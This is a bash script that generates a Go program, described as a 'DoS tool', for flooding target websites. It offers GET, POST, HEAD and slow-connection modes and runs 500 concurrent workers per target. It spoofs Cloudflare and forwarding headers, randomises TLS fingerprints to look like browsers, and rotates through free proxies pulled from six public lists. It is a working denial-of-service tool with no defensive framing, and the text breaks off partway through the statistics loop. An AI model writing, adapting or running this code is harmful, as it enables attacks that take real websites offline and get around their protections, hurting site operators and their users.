#!/bin/bash

# ----------------------------------------
# ADVANCED GO DOS TOOL - CLOUDFLARE BYPASS PRO
# MULTI-TARGET + HTTP/2 + HTTP/1.1 + Advanced Spoofing
# WITH 6 PROXY API SOURCES - FULLY FIXED
# ----------------------------------------

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Separator line
SEP="━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

clear
echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  ADVANCED CLOUDFLARE BYPASS TOOL - MULTI-TARGET${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

# Remove any existing main.go to ensure clean slate
rm -f main.go

# Create main.go file with enhanced multi-target support and multiple proxy APIs
echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go with multi-target & 6 proxy API sources...${NC}"

cat > main.go << 'EOF'
package main

import (
	"bufio"
	"crypto/rand"
	"crypto/tls"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2"
)

var (
	// Extended user agents with more diversity
	userAgents = []string{
		// Windows Chrome
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36",
		"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7445.89 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7485.98 Safari/537.36",
		// macOS Chrome
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7445.89 Safari/537.36",
		// Linux Chrome
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7485.98 Safari/537.36",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.7523.112 Safari/537.36",
		// Firefox variants
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0",
		"Mozilla/5.0 (X11; Linux i686; rv:135.0) Gecko/20100101 Firefox/135.0",
		// Mobile
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7568.89 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.7523.112 Mobile Safari/537.36",
		// Edge
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36 Edg/141.0.0.0",
		// Opera
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36 OPR/141.0.0.0",
	}

	// Extended referers
	referers = []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://duckduckgo.com/",
		"https://facebook.com/",
		"https://www.reddit.com/",
		"https://www.youtube.com/",
		"https://twitter.com/",
		"https://www.instagram.com/",
		"https://www.linkedin.com/",
		"https://github.com/",
		"https://stackoverflow.com/",
		"https://www.amazon.com/",
		"https://www.wikipedia.org/",
		"https://www.yahoo.com/",
		"https://www.tiktok.com/",
		"",
	}

	acceptLanguages = []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.8",
		"fr-FR,fr;q=0.9,en;q=0.8",
		"de-DE,de;q=0.9,en;q=0.8",
		"es-ES,es;q=0.9,en;q=0.8",
		"it-IT,it;q=0.9,en;q=0.8",
		"ja-JP,ja;q=0.9,en;q=0.8",
		"zh-CN,zh;q=0.9,en;q=0.8",
		"ru-RU,ru;q=0.9,en;q=0.8",
		"ar-SA,ar;q=0.9,en;q=0.8",
		"pt-BR,pt;q=0.9,en;q=0.8",
	}

	acceptHeaders = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"application/json, text/plain, */*",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	}

	acceptEncodings = []string{
		"gzip, deflate, br",
		"gzip, deflate",
		"br, gzip, deflate",
	}

	cacheControls = []string{
		"no-cache",
		"no-store",
		"must-revalidate",
		"max-age=0",
	}

	secCHUA = []string{
		`"Chromium";v="141", "Google Chrome";v="141", "Not?A_Brand";v="99"`,
		`"Chromium";v="142", "Google Chrome";v="142", "Not?A_Brand";v="99"`,
		`"Chromium";v="143", "Google Chrome";v="143", "Not?A_Brand";v="99"`,
		`"Firefox";v="135", "Not?A_Brand";v="99"`,
	}

	secCHUAPlatforms = []string{
		`"Windows"`,
		`"macOS"`,
		`"Linux"`,
		`"Android"`,
		`"iOS"`,
	}

	secCHUAMobiles = []string{"?0", "?1"}

	proxies         []string
	proxyMu         sync.RWMutex
	proxyIndex      uint64
	
	// 6 Different Proxy API Sources
	proxyAPIs = []string{
		"https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000",
		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
		"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
		"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/text/http.txt",
		"https://www.proxy-list.download/api/v1/get?type=http",
		"https://api.openproxylist.xyz/http.txt",
	}
	
	refreshInterval = 5 * time.Minute
)

type JA3Signature struct {
	Name             string
	CipherSuites     []uint16
	CurvePreferences []tls.CurveID
	NextProtos       []string
	MinVersion       uint16
	MaxVersion       uint16
}

var ja3Signatures = []JA3Signature{
	{
		Name: "Chrome 141-150",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Firefox 135-138",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384, tls.CurveP521},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Edge Chromium",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Safari 17-18",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
}

type AtomicCounter struct {
	val int64
}

func (c *AtomicCounter) inc() {
	atomic.AddInt64(&c.val, 1)
}

func (c *AtomicCounter) get() int64 {
	return atomic.LoadInt64(&c.val)
}

type ConnectionPool struct {
	clients    []*http.Client
	counter    uint64
	mu         sync.RWMutex
	size       int
	useProxy   bool
	targetHost string
}

type Target struct {
	URL       string
	Mode      string
	Duration  time.Duration
	Stats     *AtomicCounter
	Done      chan struct{}
	Pool      *ConnectionPool
	UseProxy  bool
}

type TargetConfig struct {
	URL      string
	Mode     string
	Duration string
	UseProxy bool
}

func getRandomJA3Signature() JA3Signature {
	return ja3Signatures[randInt(0, len(ja3Signatures)-1)]
}

func getRandomizedTLSConfig() *tls.Config {
	sig := getRandomJA3Signature()
	return &tls.Config{
		NextProtos:                  sig.NextProtos,
		InsecureSkipVerify:          true,
		MinVersion:                  sig.MinVersion,
		MaxVersion:                  sig.MaxVersion,
		CipherSuites:                sig.CipherSuites,
		CurvePreferences:            sig.CurvePreferences,
		SessionTicketsDisabled:      randBool(),
		DynamicRecordSizingDisabled: randBool(),
		Renegotiation:               tls.RenegotiateOnceAsClient,
	}
}

func NewConnectionPool(poolSize int, useProxy bool, targetHost string) *ConnectionPool {
	pool := &ConnectionPool{
		clients:    make([]*http.Client, poolSize),
		size:       poolSize,
		useProxy:   useProxy,
		targetHost: targetHost,
	}
	for i := 0; i < poolSize; i++ {
		pool.clients[i] = pool.createClient()
	}
	return pool
}

func (p *ConnectionPool) createClient() *http.Client {
	jar, _ := cookiejar.New(nil)
	var transport *http.Transport

	if p.useProxy {
		proxyStr := getNextProxy()
		if proxyStr != "" {
			if !strings.Contains(proxyStr, "://") {
				proxyStr = "http://" + proxyStr
			}
			proxyURL, err := url.Parse(proxyStr)
			if err == nil {
				transport = &http.Transport{
					Proxy:               http.ProxyURL(proxyURL),
					TLSClientConfig:     getRandomizedTLSConfig(),
					MaxIdleConns:        200,
					MaxIdleConnsPerHost: 200,
					IdleConnTimeout:     120 * time.Second,
					DisableKeepAlives:   false,
					ForceAttemptHTTP2:   true,
					DisableCompression:  false,
				}
				http2.ConfigureTransport(transport)
				return &http.Client{Transport: transport, Timeout: 30 * time.Second, Jar: jar}
			}
		}
	}

	transport = &http.Transport{
		TLSClientConfig:        getRandomizedTLSConfig(),
		MaxIdleConns:           200,
		MaxIdleConnsPerHost:    200,
		IdleConnTimeout:        120 * time.Second,
		DisableKeepAlives:      false,
		ForceAttemptHTTP2:      true,
		DisableCompression:     false,
		ResponseHeaderTimeout:  10 * time.Second,
		ExpectContinueTimeout:  1 * time.Second,
	}
	http2.ConfigureTransport(transport)
	return &http.Client{Transport: transport, Timeout: 30 * time.Second, Jar: jar}
}

func (p *ConnectionPool) GetClient() *http.Client {
	idx := atomic.AddUint64(&p.counter, 1) % uint64(p.size)
	return p.clients[idx]
}

func (p *ConnectionPool) CloseIdleConnections() {
	for _, client := range p.clients {
		if tr, ok := client.Transport.(*http.Transport); ok {
			tr.CloseIdleConnections()
		}
	}
}

// Load proxies from multiple APIs with fallback
func loadProxiesFromAPI() {
	var allProxies []string
	
	for apiIndex, apiURL := range proxyAPIs {
		client := &http.Client{Timeout: 15 * time.Second}
		resp, err := client.Get(apiURL)
		if err != nil {
			continue
		}
		
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}
		
		content := string(body)
		lines := strings.Split(content, "\n")
		apiProxies := 0
		
		for _, line := range lines {
			line = strings.TrimSpace(line)
			// Validate proxy format (IP:PORT)
			if line != "" && !strings.HasPrefix(line, "#") && strings.Contains(line, ":") {
				parts := strings.Split(line, ":")
				if len(parts) == 2 {
					// Basic IP validation
					ipParts := strings.Split(parts[0], ".")
					if len(ipParts) == 4 {
						allProxies = append(allProxies, line)
						apiProxies++
					}
				}
			}
		}
		
		if apiProxies > 0 {
			fmt.Printf("[Proxy] Loaded %d proxies from API %d\n", apiProxies, apiIndex+1)
		}
	}
	
	// Remove duplicates
	uniqueProxies := make(map[string]bool)
	var uniqueList []string
	for _, proxy := range allProxies {
		if !uniqueProxies[proxy] {
			uniqueProxies[proxy] = true
			uniqueList = append(uniqueList, proxy)
		}
	}
	
	if len(uniqueList) > 0 {
		proxyMu.Lock()
		proxies = uniqueList
		proxyMu.Unlock()
		atomic.StoreUint64(&proxyIndex, 0)
		fmt.Printf("[Proxy] Total unique proxies: %d from %d APIs\n", len(proxies), len(proxyAPIs))
	} else {
		fmt.Printf("[Proxy] Warning: No proxies loaded from any API\n")
	}
}

func proxyRefresher() {
	// Initial delay
	time.Sleep(30 * time.Second)
	
	ticker := time.NewTicker(refreshInterval)
	defer ticker.Stop()
	
	for range ticker.C {
		fmt.Printf("\n[Proxy] Refreshing proxies from APIs...\n")
		loadProxiesFromAPI()
	}
}

func getNextProxy() string {
	proxyMu.RLock()
	n := len(proxies)
	if n == 0 {
		proxyMu.RUnlock()
		return ""
	}
	idx := atomic.AddUint64(&proxyIndex, 1) % uint64(n)
	p := proxies[idx]
	proxyMu.RUnlock()
	return p
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(1, 255), randInt(1, 255), randInt(1, 255))
}

func randomIPv6() string {
	parts := make([]string, 8)
	for i := range parts {
		parts[i] = fmt.Sprintf("%x", randInt(0, 65535))
	}
	return strings.Join(parts, ":")
}

func randomUA() string {
	return userAgents[randInt(0, len(userAgents)-1)]
}

func randomReferer() string {
	return referers[randInt(0, len(referers)-1)]
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	rand.Read(b)
	for i := range b {
		b[i] = letters[int(b[i])%len(letters)]
	}
	return string(b)
}

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return min + int(n.Int64())
}

func randBool() bool {
	n, _ := rand.Int(rand.Reader, big.NewInt(2))
	return n.Int64() == 1
}

func generateCacheBust() string {
	styles := []string{
		"?v=" + strconv.Itoa(randInt(1, 1000000)),
		"?_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
		"?rnd=" + randomString(16),
		"?t=" + strconv.FormatInt(time.Now().Unix(), 10),
	}
	return styles[randInt(0, len(styles)-1)]
}

func generatePath() string {
	paths := []string{
		"/", "/index.html", "/home", "/main", "/default", "/welcome",
		"/api/v1/users", "/api/v1/data", "/api/v2/info", "/api/v3/status",
		"/wp-admin", "/admin", "/login", "/dashboard", "/products",
		"/services", "/about", "/contact", "/blog", "/news",
	}
	return paths[randInt(0, len(paths)-1)]
}

func generateStudentNumber() string {
	return fmt.Sprintf("%d-%05d", randInt(2015, 2025), randInt(1, 99999))
}

func generateCookies() []*http.Cookie {
	cookies := []*http.Cookie{}
	if randBool() {
		cookies = append(cookies, &http.Cookie{Name: "session_id", Value: randomString(24), Path: "/"})
	}
	if randBool() {
		cookies = append(cookies, &http.Cookie{Name: "csrf_token", Value: randomString(16), Path: "/"})
	}
	if randBool() {
		cookies = append(cookies, &http.Cookie{Name: "__cfduid", Value: randomString(32), Path: "/"})
	}
	if randBool() {
		cookies = append(cookies, &http.Cookie{Name: "_ga", Value: "GA1.2." + randomString(12), Path: "/"})
	}
	return cookies
}

// Enhanced Cloudflare bypass headers
func addCloudflareBypassHeaders(req *http.Request) {
	spoofIP := randomIP()
	spoofIPv6 := randomIPv6()
	countries := []string{"US", "GB", "CA", "AU", "DE", "FR", "JP", "CN", "RU", "BR", "IN", "KR", "IT", "ES", "MX"}
	
	req.Header.Set("CF-Connecting-IP", spoofIP)
	req.Header.Set("CF-IPCountry", countries[randInt(0, len(countries)-1)])
	req.Header.Set("CF-Ray", randomString(16)+"-"+strings.ToUpper(randomString(4)))
	req.Header.Set("CF-Visitor", `{"scheme":"https"}`)
	req.Header.Set("CDN-Loop", "cloudflare")
	req.Header.Set("X-Forwarded-For", spoofIP+", "+spoofIP+", "+randomIP())
	req.Header.Set("X-Forwarded-Proto", "https")
	req.Header.Set("X-Forwarded-Host", req.Host)
	req.Header.Set("X-Forwarded-Port", "443")
	req.Header.Set("X-Real-IP", spoofIP)
	req.Header.Set("True-Client-IP", spoofIP)
	req.Header.Set("X-Originating-IP", spoofIP)
	req.Header.Set("X-Remote-IP", spoofIP)
	req.Header.Set("X-Remote-Addr", spoofIP)
	req.Header.Set("X-Client-IP", spoofIP)
	req.Header.Set("X-Forwarded-For-IPv6", spoofIPv6)
	req.Header.Set("X-Real-IPv6", spoofIPv6)
	req.Header.Set("X-Proxy-IP", spoofIP)
	req.Header.Set("X-Original-URL", req.URL.String())
	req.Header.Set("X-Rewrite-URL", req.URL.String())
	req.Header.Set("X-Orig-URL", req.URL.String())
	req.Header.Set("CF-Request-ID", randomString(24))
	req.Header.Set("CF-Worker", randomString(16))
	req.Header.Set("X-Sec-Request", randomString(12))
	req.Header.Set("X-Request-ID", randomString(24))
	req.Header.Set("X-Correlation-ID", randomString(16))
	
	if randBool() {
		req.Header.Set("Sec-Fetch-Dest", "document")
		req.Header.Set("Sec-Fetch-Mode", "navigate")
		req.Header.Set("Sec-Fetch-Site", "none")
		req.Header.Set("Sec-Fetch-User", "?1")
	}
	
	if randInt(1, 100) <= 60 {
		req.Header.Set("Sec-CH-UA", secCHUA[randInt(0, len(secCHUA)-1)])
		req.Header.Set("Sec-CH-UA-Platform", secCHUAPlatforms[randInt(0, len(secCHUAPlatforms)-1)])
		req.Header.Set("Sec-CH-UA-Mobile", secCHUAMobiles[randInt(0, len(secCHUAMobiles)-1)])
		req.Header.Set("Sec-CH-UA-Arch", `"x86"`)
		req.Header.Set("Sec-CH-UA-Bitness", `"64"`)
		req.Header.Set("Sec-CH-UA-Full-Version-List", `"141.0.7390.108"`)
	}
	
	req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
	if randBool() {
		req.Header.Set("Accept-Encoding", acceptEncodings[randInt(0, len(acceptEncodings)-1)])
	}
	req.Header.Set("Accept-Language", acceptLanguages[randInt(0, len(acceptLanguages)-1)])
	req.Header.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("DNT", strconv.Itoa(randInt(0, 1)))
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Priority", "u=0, i")
	
	if randBool() {
		req.Header.Set("Save-Data", "on")
	}
}

func attackTarget(target Target, workerID int, wg *sync.WaitGroup) {
	defer wg.Done()
	
	for {
		select {
		case <-target.Done:
			return
		default:
			client := target.Pool.GetClient()
			path := generatePath()
			
			if target.Mode != "SLOW" && randInt(1, 100) <= 70 {
				path += generateCacheBust()
			}

			fullURL := target.URL
			if !strings.HasSuffix(target.URL, "/") && !strings.HasPrefix(path, "/") {
				fullURL += "/" + path
			} else if strings.HasSuffix(target.URL, "/") && strings.HasPrefix(path, "/") {
				fullURL = strings.TrimSuffix(target.URL, "/") + path
			} else {
				fullURL += path
			}

			var req *http.Request
			var err error

			if target.Mode == "SLOW" {
				u, _ := url.Parse(target.URL)
				host := u.Hostname()
				port := "80"
				if u.Scheme == "https" {
					port = "443"
				}
				conn, err := net.DialTimeout("tcp", host+":"+port, 5*time.Second)
				if err != nil {
					time.Sleep(200 * time.Millisecond)
					continue
				}
				conn.SetDeadline(time.Now().Add(300 * time.Second))
				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n", path, host, randomUA())
				target.Stats.inc()
				time.Sleep(1 * time.Second)
				conn.Close()
				continue
			}

			if target.Mode == "GET" {
				req, err = http.NewRequest("GET", fullURL, nil)
			} else if target.Mode == "POST" {
				payload := fmt.Sprintf("student_id=%s&password=%s&email=%s@example.com&csrf=%s", 
					generateStudentNumber(), randomString(randInt(8, 16)), randomString(10), randomString(20))
				req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
				if err == nil {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
			} else if target.Mode == "HEAD" {
				req, err = http.NewRequest("HEAD", fullURL, nil)
			} else {
				continue
			}

			if err != nil {
				continue
			}

			req.Header.Set("User-Agent", randomUA())
			req.Header.Set("Referer", randomReferer())
			req.Header.Set("Connection", "keep-alive")
			
			cookies := generateCookies()
			for _, cookie := range cookies {
				req.AddCookie(cookie)
			}
			
			addCloudflareBypassHeaders(req)

			if randInt(1, 100) <= 10 {
				time.Sleep(time.Duration(randInt(1, 5)) * time.Millisecond)
			}

			resp, err := client.Do(req)
			if err == nil {
				if target.Mode != "HEAD" {
					io.Copy(io.Discard, resp.Body)
				}
				resp.Body.Close()
			}
			target.Stats.inc()
		}
	}
}

func loadTargetsFromFile(filename string) ([]TargetConfig, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var targets []TargetConfig
	scanner := bufio.NewScanner(file)
	
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		
		// Format: URL|MODE|DURATION|PROXY
		parts := strings.Split(line, "|")
		if len(parts) >= 3 {
			target := TargetConfig{
				URL:      strings.TrimSpace(parts[0]),
				Mode:     strings.ToUpper(strings.TrimSpace(parts[1])),
				Duration: strings.TrimSpace(parts[2]),
				UseProxy: len(parts) >= 4 && parts[3] == "proxy",
			}
			
			if !strings.HasPrefix(target.URL, "http") {
				if strings.Contains(target.URL, ":") {
					target.URL = "http://" + target.URL
				} else {
					target.URL = "https://" + target.URL
				}
			}
			
			targets = append(targets, target)
		}
	}
	
	return targets, scanner.Err()
}

func printBanner() {
	fmt.Print("\033[36m")
	fmt.Println(" █████╗ ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗ ██████╗███████╗██████╗ ")
	fmt.Println("██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║██╔════╝██╔════╝██╔══██╗")
	fmt.Println("███████║██║  ██║██║   ██║███████║██╔██╗ ██║██║     █████╗  ██║  ██║")
	fmt.Println("██╔══██║██║  ██║╚██╗ ██╔╝██╔══██║██║╚██╗██║██║     ██╔══╝  ██║  ██║")
	fmt.Println("██║  ██║██████╔╝ ╚████╔╝ ██║  ██║██║ ╚████║╚██████╗███████╗██████╔╝")
	fmt.Println("╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝╚═════╝ ")
	fmt.Println("         Cloudflare Bypass - Multi-Target + 6 Proxy APIs            ")
	fmt.Println("\033[0m")
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU() * 4)
	
	printBanner()
	
	if len(os.Args) < 2 {
		fmt.Println("Usage: ./main <target_file|single_target> [seconds] [mode] [proxy]")
		fmt.Println("")
		fmt.Println("Single Target Mode:")
		fmt.Println("  ./main https://target.com 60 GET")
		fmt.Println("  ./main https://target.com 60 GET proxy")
		fmt.Println("")
		fmt.Println("Multi-Target Mode (create site.txt):")
		fmt.Println("  Format in site.txt: URL|MODE|DURATION|PROXY")
		fmt.Println("  Example site.txt entries:")
		fmt.Println("    https://target1.com|GET|60")
		fmt.Println("    https://target2.com|POST|120|proxy")
		fmt.Println("    https://target3.com|SLOW|30")
		fmt.Println("  Then run: ./main site.txt")
		fmt.Println("")
		fmt.Println("Modes: GET, POST, HEAD, SLOW")
		fmt.Println("")
		fmt.Println("Proxy Features:")
		fmt.Println("  • 6 different proxy API sources")
		fmt.Println("  • Automatic proxy rotation")
		fmt.Println("  • Duplicate removal")
		fmt.Println("  • Automatic refresh every 5 minutes")
		os.Exit(1)
	}
	
	var targets []TargetConfig
	var err error
	
	// Check if argument is a file
	if _, err := os.Stat(os.Args[1]); err == nil {
		// File exists - multi-target mode
		targets, err = loadTargetsFromFile(os.Args[1])
		if err != nil {
			fmt.Printf("Error loading targets: %v\n", err)
			os.Exit(1)
		}
		if len(targets) == 0 {
			fmt.Println("No valid targets found in file")
			os.Exit(1)
		}
		fmt.Printf("[+] Loaded %d targets from %s\n", len(targets), os.Args[1])
	} else {
		// Single target mode
		if len(os.Args) < 4 {
			fmt.Println("Single target mode requires: <url> <seconds> <mode> [proxy]")
			os.Exit(1)
		}
		useProxy := len(os.Args) >= 5 && os.Args[4] == "proxy"
		targets = []TargetConfig{
			{
				URL:      os.Args[1],
				Mode:     strings.ToUpper(os.Args[3]),
				Duration: os.Args[2],
				UseProxy: useProxy,
			},
		}
	}
	
	// Validate modes
	for _, t := range targets {
		if t.Mode != "GET" && t.Mode != "POST" && t.Mode != "HEAD" && t.Mode != "SLOW" {
			fmt.Printf("Invalid mode '%s' for target %s. Must be GET, POST, HEAD, or SLOW\n", t.Mode, t.URL)
			os.Exit(1)
		}
	}
	
	// Load proxies if any target uses them
	useProxyAny := false
	for _, t := range targets {
		if t.UseProxy {
			useProxyAny = true
			break
		}
	}
	
	if useProxyAny {
		fmt.Printf("[Proxy] Loading proxies from %d different APIs...\n", len(proxyAPIs))
		loadProxiesFromAPI()
		if len(proxies) > 0 {
			go proxyRefresher()
			fmt.Printf("[Proxy] Proxy rotation active - refreshing every %v\n", refreshInterval)
		} else {
			fmt.Println("[!] No proxies available, disabling proxy mode for all targets")
			for i := range targets {
				targets[i].UseProxy = false
			}
		}
	}
	
	fmt.Println("[+] Starting multi-target attack... Press Ctrl+C to stop")
	fmt.Println("")
	
	var allWg sync.WaitGroup
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	globalDone := make(chan struct{})
	
	// Start attack for each target
	targetList := make([]Target, len(targets))
	for i, t := range targets {
		durationSec, convErr := strconv.Atoi(t.Duration)
		if convErr != nil {
			fmt.Printf("Invalid duration for target %s: %s\n", t.URL, t.Duration)
			continue
		}
		
		duration := time.Duration(durationSec) * time.Second
		poolSize := 500
		pool := NewConnectionPool(poolSize, t.UseProxy, "")
		
		targetObj := Target{
			URL:      t.URL,
			Mode:     t.Mode,
			Duration: duration,
			Stats:    &AtomicCounter{},
			Done:     make(chan struct{}),
			Pool:     pool,
			UseProxy: t.UseProxy,
		}
		targetList[i] = targetObj
		
		fmt.Printf("[✓] Target %d: %s | Mode: %s | Duration: %ds | Proxy: %v\n", 
			i+1, t.URL, t.Mode, durationSec, t.UseProxy)
		
		// Start workers for this target
		const workersPerTarget = 500
		for w := 0; w < workersPerTarget; w++ {
			allWg.Add(1)
			go attackTarget(targetObj, w, &allWg)
		}
		
		// Set timer to stop this target
		go func(tg Target) {
			time.Sleep(tg.Duration)
			close(tg.Done)
		}(targetObj)
	}
	
	fmt.Println("")
	fmt.Println("[+] Attack in progress... (Press Ctrl+C to stop early)")
	fmt.Println("")
	
	// Display statistics
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	
	startTime := time.Now()
	
	for {
		select {
		case <-globalDone:
			elapsed := time.Since(startTime).Seconds()
			fmt.Println("\n[+] Attack completed!")
			fmt.Println("\n📊 Final Statistics:")
			fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
			totalReqs := int64(0)
			for i, tg := range targetList {
				if tg.Stats != nil {
					reqs := tg.Stats.get()
					totalReqs += reqs
					rps := float64(reqs) / elapsed
					fmt.Printf("Target %d: %s | Requests: %d | RPS: %.0f\n", 
						i+1, tg.URL, reqs, rps)
					tg.Pool.CloseIdleConnections()
				}
			}
			fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
			fmt.Printf("Total Requests: %d | Total Time: %.0fs | Avg RPS: %.0f\n", 
				totalReqs, elapsed, float64(totalReqs)/elapsed)
			return
		case <-sig:
			close(globalDone)
		case <-ticker.C:
			elapsed := time.Since(startTime).Seconds()
			fmt.Printf("\033[H\033[2J") // Clear screen
			printBanner()
			fmt.Println("\n📊 Live Statistics:")
			fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
